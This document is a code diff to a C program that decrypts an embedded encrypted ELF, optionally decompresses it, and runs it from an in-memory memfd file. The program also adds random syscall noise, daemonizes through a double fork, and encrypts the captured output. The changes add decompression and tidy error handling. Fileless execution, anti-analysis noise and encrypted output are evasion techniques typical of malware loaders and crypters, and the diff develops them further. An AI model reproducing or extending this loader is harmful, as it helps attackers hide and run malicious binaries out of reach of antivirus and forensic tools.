@@ -21,6 +21,7 @@
 #include <sys/wait.h>
 #include <termios.h>
 #include <unistd.h>
+#include <errno.h>
 
 #ifdef EMBED_BLOB
 extern const unsigned char _binary_target_enc_start[];
@@ -192,6 +193,23 @@ static int decrypt_target_to_memfd(const unsigned char* enc_bytes, size_t enc_sz
     secure_zero(key, sizeof key);
     munlock(key, sizeof key);
 
+    // Decompress if needed
+    if (hdr.flags & 1) {
+        unsigned char* dec = NULL;
+        size_t dec_len = 0;
+        if (zlib_decompress(pt, ptsz, &dec, &dec_len) != 0) {
+            secure_zero(pt, ptsz);
+            munlock(pt, ptsz);
+            free(pt);
+            die("decompression failed");
+        }
+        secure_zero(pt, ptsz);
+        munlock(pt, ptsz);
+        free(pt);
+        pt = dec;
+        ptsz = dec_len;
+    }
+
     if (ptsz < 4 || !(pt[0] == 0x7f && pt[1] == 'E' && pt[2] == 'L' && pt[3] == 'F')) {
         secure_zero(pt, ptsz);
         munlock(pt, ptsz);
@@ -204,21 +222,19 @@ static int decrypt_target_to_memfd(const unsigned char* enc_bytes, size_t enc_sz
     int mfd = try_memfd_or_fallback("elf");
     add_syscall_noise(rand_r(&rseed) % 5);
     if (mfd < 0) {
-        perror("memfd_create");
         secure_zero(pt, ptsz);
         munlock(pt, ptsz);
         free(pt);
-        exit(1);
+        die("memfd_create");
     }
 
     ssize_t w = write(mfd, pt, ptsz);
     if (w != (ssize_t)ptsz) {
-        perror("write memfd");
         close(mfd);
         secure_zero(pt, ptsz);
         munlock(pt, ptsz);
         free(pt);
-        exit(1);
+        die("write memfd");
     }
 
     add_syscall_noise(rand() % 2);
@@ -264,7 +280,7 @@ static void capture_and_encrypt_output(int read_fd, const char* outfile,
         secure_zero(key, sizeof key);
         munlock(key, sizeof key);
         secure_zero(salt, sizeof salt);
-        exit(1);
+        die("open outfile");
     }
 
     // write the header only once if it's the first chunk being written
@@ -349,18 +365,18 @@ static void daemonize_and_run(int mfd, char** argv2, const char* outfile,
         return; // parent returns immediately to shell
 
     if (setsid() < 0)
-        _exit(1);
+        die("fork error");
 
     pid = fork();
     if (pid < 0)
-        _exit(1);
+        die("fork error");
     if (pid > 0)
         _exit(0); // middle process exits
 
     // grandchild (daemon)
     pid_t cpid = fork();
     if (cpid < 0)
-        _exit(1);
+        die("fork error");
 
     if (cpid == 0) {
         // writer child process for target
@@ -394,6 +410,11 @@ static void daemonize_and_run(int mfd, char** argv2, const char* outfile,
 }
 
 int main(int argc, char** argv) {
+#ifdef DEBUG
+    printf("DEBUG mode enabled\n");
+#endif
+
+    
     if (sodium_init() < 0)
         die("libsodium init failed");
 
